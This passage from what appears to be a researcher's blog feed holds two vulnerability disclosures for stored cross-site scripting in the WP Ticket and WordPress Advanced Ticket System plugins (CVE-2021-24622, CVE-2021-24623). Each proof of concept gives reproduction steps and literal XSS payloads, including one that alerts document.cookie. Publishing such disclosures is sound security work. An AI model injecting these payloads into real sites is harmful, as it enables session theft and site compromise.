<p>Navigate to <code class="language-plaintext highlighter-rouge">WP Ticket &gt; Forms &gt;  edit layout of "Open a Ticket" or "Search Tickets" &gt; on "Editing Form" Setting menu</code>.</p>

<p>Select a form field and you can edit the “Label” with a cross-site scripting (XSS) payload such as</p>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>v &lt; 5.10.3 - "&gt;&lt;script&gt;alert(/XSS/)&lt;/script&gt; 
v &lt;= 5.10.3 - " style=animation-name:rotation onanimationstart=alert(/XSS/)//
</code></pre></div></div>
<p>All of the parameters on the “Editing Form” are vulnerable.To trigger the XSS payload, refresh the “Editing Form” page.</p>

<h1 id="timeline">Timeline</h1>
<ul>
  <li>Publicly Published : 2021-09-20 (about 11 days ago)</li>
  <li>Added : 2021-09-20 (about 11 days ago)</li>
  <li>Last Updated : 2021-09-20 (about 11 days ago)</li>
</ul>

<h1 id="links">Links</h1>
<ul>
  <li><a href="https://wpscan.com/vulnerability/41a2c72c-7db1-473a-8844-47f6ae9d0594">WP Ticket &lt; 5.10.4 - Admin+ Stored Cross-Site Scripting</a></li>
  <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24622">CVE-2021-24622</a></li>
</ul>]]></content><author><name>twseptian</name></author><category term="CVE" /><category term="CVE" /><summary type="html"><![CDATA[Description The plugin does not sanitize or escape form fields before outputting it in the List, which could allow high privilege users to perform Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed.]]></summary></entry><entry><title type="html">WordPress Advanced Ticket System &amp;lt; 1.0.64 - Authenticated Stored Cross-Site Scripting (XSS)</title><link href="http://localhost:4000/cve/CVE-2021-24623/" rel="alternate" type="text/html" title="WordPress Advanced Ticket System &amp;lt; 1.0.64 - Authenticated Stored Cross-Site Scripting (XSS)" /><published>2021-10-01T00:00:00+07:00</published><updated>2021-10-01T14:58:26+07:00</updated><id>http://localhost:4000/cve/CVE-2021-24623</id><content type="html" xml:base="http://localhost:4000/cve/CVE-2021-24623/"><![CDATA[<h1 id="description">Description</h1>
<p>The plugin does not sanitize or escape form values before saving to the database or when outputting, which allows high privilege users to perform Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed.</p>

<h1 id="proof-of-concept">Proof of Concept</h1>
<p>Navigate to <code class="language-plaintext highlighter-rouge">Tickets &gt; Add New &gt;  add all information on the title, post, Ticket type, Ticket priority, Ticket status &gt; click update</code> and intercept the request using burp suite. The parameters <code class="language-plaintext highlighter-rouge">"wats_select_ticket_type"</code>, <code class="language-plaintext highlighter-rouge">"wats_select_ticket_priority"</code>, <code class="language-plaintext highlighter-rouge">"wats_select_ticket_status"</code> can be injected with cross-site scripting (XSS), such as <code class="language-plaintext highlighter-rouge">test"&gt;&lt;script&gt;alert('test')&lt;/script&gt;;</code> <code class="language-plaintext highlighter-rouge">test"&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; payload</code>. Next Click Forward on burp suite. To trigger the XSS payload, Open the permalink post/ticket page.</p>

<h1 id="timeline">Timeline</h1>
<ul>
  <li>Publicly Published : 2021-08-16 (about 1 months ago)</li>
  <li>Added : 2021-08-16 (about 1 months ago)</li>
  <li>Last Updated : 2021-08-16 (about 1 months ago)</li>
</ul>

<h1 id="links">Links</h1>
<ul>
  <li><a href="https://wpscan.com/vulnerability/41d9027c-a982-44c7-889e-721333496b5c">WordPress Advanced Ticket System &lt; 1.0.64 - Authenticated Stored Cross-Site Scripting (XSS)</a></li>
  <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24623">CVE-2021-24623</a></li>
</ul>]]></content><author><name>twseptian</name></author><category term="CVE" /><category term="CVE" /><summary type="html"><![CDATA[Description The plugin does not sanitize or escape form values before saving to the database or when outputting, which allows high privilege users to perform Cross-Site Scripting attacks even when the unfiltered_html capability is disallowed.]]></summary></entry></feed>